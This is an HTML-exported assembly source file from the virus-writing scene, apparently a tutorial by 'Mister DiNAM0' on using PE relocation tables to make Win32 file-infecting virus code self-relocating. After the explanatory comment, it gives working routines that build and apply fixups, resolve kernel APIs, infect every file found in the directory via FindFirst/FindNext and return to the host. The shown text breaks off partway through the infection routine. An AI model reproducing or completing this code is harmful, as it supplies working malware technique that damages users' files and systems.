<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Mister DiNAM0's magic relocation miniroutines </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Hey pal, you remember your first com virus, when typing call deltaoffset</span><span class="sc0">
</span><span class="sc1">;  and discovering the lea instruction. Yes, this old good time when you</span><span class="sc0">
</span><span class="sc1">;  were still discovering sexuality. Now, I will show you somethinge else.</span><span class="sc0">
</span><span class="sc1">;  No, nothing related to sex, but about the delta pointers. I was looking</span><span class="sc0">
</span><span class="sc1">;  my small PE a few days ago, and I tought, these relocs are never used,</span><span class="sc0">
</span><span class="sc1">;  but only for dlls. Fuckoff, that's shit, my virus is also a relocatable</span><span class="sc0">
</span><span class="sc1">;  code, so I could use these datas for my virus. That's rite, but I have to</span><span class="sc0">
</span><span class="sc1">;  save the reloc in my virus code, so what to do ? Okay, Mister DiNAM0 will</span><span class="sc0">
</span><span class="sc1">;  explain you what to do.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  First, imagine you have coded your self PE virus (I asked a friend on IRC</span><span class="sc0">
</span><span class="sc1">;  to send me a basic one for testing) </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  This virus have all a series of pointers into his code. Usually, you make </span><span class="sc0">
</span><span class="sc1">;  lea edx,[ebp+payload] or such instruction. But this suck, and appears </span><span class="sc0">
</span><span class="sc1">;  strange when tracing/emulating. </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  But, when tasm compile the binary, it build a reloc section. This reloc</span><span class="sc0">
</span><span class="sc1">;  section contains offset where you have to apply the delta pointer. The </span><span class="sc0">
</span><span class="sc1">;  Delta pointer is basically a substraction of actual pointer by image base</span><span class="sc0">
</span><span class="sc1">;  location. Adding this delta pointer result that the original code have </span><span class="sc0">
</span><span class="sc1">;  all pointers and direction correct even if it's not loaded (runned) at</span><span class="sc0">
</span><span class="sc1">;  his native adress</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Using theses routines have only 1 small difficulty</span><span class="sc0">
</span><span class="sc1">;       -&gt; you have to know how much reloc your virus need</span><span class="sc0">
</span><span class="sc1">;  So the tip is to preview a big buffer for them, like 1 ko, on this exemple</span><span class="sc0">
</span><span class="sc1">;  I just got about 52 bytes of relocation.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  the BuildFixUp parameters:   ecx = how much of relocation</span><span class="sc0">
</span><span class="sc1">;               edx = from where you start relocation</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  relocation are placed on a buffer called relocbuff (you have to implement</span><span class="sc0">
</span><span class="sc1">;  the buffers somewhere in your virus)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             return:   ecx = relocbuff ideal size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Okay, I got relocation, so what I need to do now ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   When infecting, the next copy of your virus will be somewhere else in</span><span class="sc0">
</span><span class="sc1">;  the memory, but as win95/Nt don't apply anymore reloc and they are killed</span><span class="sc0">
</span><span class="sc1">;  with win2K. You can put your virus code in the host, and apply the new</span><span class="sc0">
</span><span class="sc1">;  delta offset to your virus. Now, your virus will be totally integrated to</span><span class="sc0">
</span><span class="sc1">;  his environment. To do such, use the small routine makefixup. Your virus</span><span class="sc0">
</span><span class="sc1">;  will at each infection apply reloc to a copy of his image. So makefixup and</span><span class="sc0">
</span><span class="sc1">;  reloc buffer HAVE TO BE into the virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      makefixup parameters:   edx = new address to apply reloc to</span><span class="sc0">
</span><span class="sc1">;                  esi = old adress from where we come</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  All this can appears a bit complicate, it's very easy to code himself and</span><span class="sc0">
</span><span class="sc1">;  it works well. Anyway, it's a great challenge but stop blabla, show code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                           Mister DiNAM0 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Greets: - to too much underground poeple that nobody knows :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">;Define the needed external functions and constants here.</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                                   </span><span class="sc1">;the data area</span><span class="sc0">

</span><span class="sc5">dummy</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;this needs some data or it won't work!</span><span class="sc0">

</span><span class="sc5">imagebase</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">   </span><span class="sc1">;this will have to be fixed</span><span class="sc0">
                    </span><span class="sc1">;but it's in 80% of the time the case.</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start0</span><span class="sc0">   </span><span class="sc1">; this will be a test, we will</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start0</span><span class="sc0">    </span><span class="sc1">; drop the virus on the stack</span><span class="sc0">
                    </span><span class="sc1">; apply the reloc over there and run </span><span class="sc0">
                    </span><span class="sc1">; it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">buildfixup</span><span class="sc0">      </span><span class="sc1">; generate the self relocations</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">finboom</span><span class="sc4">-</span><span class="sc5">boom</span><span class="sc0">    </span><span class="sc1">; copy virus to stack</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; set for a future call</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currentbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; save current base</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currentbase</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; and preview for apply reloc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy it over there</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; and set last image</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currentbase</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; restore it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currentbase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; calculate new base</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currentbase</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">currentbase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; blablabla</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">makefixup</span><span class="sc0">           </span><span class="sc1">; apply fix ups</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; execute virus on stack</span><span class="sc0">

</span><span class="sc1">; build fixup - - - - - - - - - - - - - - It will search himself the offset of</span><span class="sc0">
</span><span class="sc1">;                     relocations, let him do the job</span><span class="sc0">

</span><span class="sc5">buildfixup</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">relocbuff</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; where will be put rel</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">imagebase</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get pe header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">imagebase</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; point to reloc</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">imagebase</span><span class="sc0">               </span><span class="sc1">; sections</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">164</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; relocation size</span><span class="sc0">

</span><span class="sc5">relocmylife</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">muyloop1</span><span class="sc0">                </span><span class="sc1">; not concerned by</span><span class="sc0">
                            </span><span class="sc1">; relocation?</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporaryRVA0</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; look the rva of</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; the following </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; relocs</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; point to rel</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; point to rel size</span><span class="sc0">

</span><span class="sc5">loopmylife</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get the curr</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">11110000b</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">otherreloctype</span><span class="sc0">              </span><span class="sc1">; I never saw other</span><span class="sc0">
                            </span><span class="sc1">; type</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">111111111111b</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporaryRVA0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">imagebase</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">otherreloctype</span><span class="sc0">              </span><span class="sc1">; if rel out of</span><span class="sc0">
                            </span><span class="sc1">; virus limit,</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; don't save it</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">otherreloctype</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; now save it into</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; virus</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">otherreloctype</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; get next reloc</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loopmylife</span><span class="sc0">              </span><span class="sc1">; scan each reloc</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">muyloop1</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; look if there's other</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; relocation block</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">relocmylife</span><span class="sc0">

</span><span class="sc5">finishapplyreloc</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocbuff</span><span class="sc0">            </span><span class="sc1">; return size of</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; relocation buffer</span><span class="sc0">

</span><span class="sc5">currentbase</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">imagebase</span><span class="sc0">           </span><span class="sc1">; take care only</span><span class="sc0">
</span><span class="sc5">temporaryRVA0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; if image base &lt;&gt;</span><span class="sc0">
                            </span><span class="sc1">; 00400000h</span><span class="sc0">
</span><span class="sc1">; build fixup - - - - - - - - - - - - - -</span><span class="sc0">

</span><span class="sc5">boom</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">win9x</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">
</span><span class="sc5">winNt</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">077f00000h</span><span class="sc0">

</span><span class="sc1">; win2000 equ 07bf0000h ???</span><span class="sc0">

</span><span class="sc5">kernelbase</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">win9x</span><span class="sc0">

</span><span class="sc5">start0</span><span class="sc4">:</span><span class="sc0">     
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">; save all reg</span><span class="sc0">
                        </span><span class="sc1">; IP of Odelta + 5</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReturnToHost</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; save the return to host</span><span class="sc0">
                    </span><span class="sc1">; yeah it's a dumb way but I don't</span><span class="sc0">
                    </span><span class="sc1">; want to code an other</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Apilist</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; set the GetTheList procedure</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Hardcoded</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">               </span><span class="sc1">; number of api</span><span class="sc0">

</span><span class="sc5">GetTheList</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; now start the loop</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetProc</span><span class="sc0">             </span><span class="sc1">; get the RVA of the API in ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Fini</span><span class="sc0">                </span><span class="sc1">; if problem then quit </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">GetTheList</span><span class="sc0">          </span><span class="sc1">; get ALL Apis</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirst</span><span class="sc0">           </span><span class="sc1">; find 1st file in the </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; directory</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Error0</span><span class="sc0">

</span><span class="sc5">boucle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infection</span><span class="sc0">           </span><span class="sc1">; infect it</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNext</span><span class="sc0">            </span><span class="sc1">; scan if there's an other one</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">boucle</span><span class="sc0">

</span><span class="sc5">Error0</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc5">Fini</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReturnToHost</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; restore host IP back</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; restore everything</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">                </span><span class="sc1">; push host original</span><span class="sc0">
                            </span><span class="sc1">; entry point</span><span class="sc0">
</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; put in eax so the</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; emulation is perfect</span><span class="sc0">
                    </span><span class="sc1">; take a look on the SEH ( eax in win95</span><span class="sc0">
                    </span><span class="sc1">; equal Entry Point RVA</span><span class="sc0">
</span><span class="sc5">Infection</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Pseudo :]</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Open_file</span><span class="sc0">           </span><span class="sc1">; open file </span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Finished</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">           </span><span class="sc1">; search at 3Ch the offset of</span><span class="sc0">
                        </span><span class="sc1">; the extended exe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">             </span><span class="sc1">; Read 4 bytes and </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; save it in ReadyForHost</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; set edx at ReadyForHost</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">           </span><span class="sc1">; seek to edx in the current</span><span class="sc0">
                        </span><span class="sc1">; file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">0f8h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; read a lot of bytes from </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_file</span><span class="sc0">           </span><span class="sc1">; there ( just to play with</span><span class="sc0">
